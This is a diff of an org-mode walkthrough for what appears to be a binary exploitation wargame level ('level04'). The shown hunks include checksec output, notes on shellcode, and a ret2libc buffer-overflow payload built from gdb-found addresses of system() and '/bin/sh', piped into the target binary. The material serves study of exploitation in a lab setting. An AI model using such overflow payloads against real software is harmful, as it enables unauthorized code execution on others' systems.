@@ -1,5 +1,5 @@
-* Data Gathering
 #+title: Walkthrough
+* Data Gathering
 ** check sec
 #+begin_src shell
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
@@ -492,7 +492,7 @@ may i need to fork to and in the fork execute the shellcode?
     GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
   should be able to use stack but its kind of trycky i am going to use a env var.
   I tested in my machine and doesn't work.
-    #+end_src
+#+end_src
 **** Cat of the file.
 #+begin_src shell
            push   0x73736170
@@ -563,9 +563,7 @@ may i need to fork to and in the fork execute the shellcode?
   $1 = (<text variable, no debug info> *) 0xf7e6aed0 <system>
      find 0xf7e2c000,0xf7fd0000,"/bin/sh"
     0xf7f897ec /bin/sh
-  "aaaa"
-
-  "BBBB" = return va of system.
+  "aaaa" = return va of system.
       (python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "aaaa" + "\xec\x97\xf8\xf7"'; cat -) | ./level04
 
 #+end_src
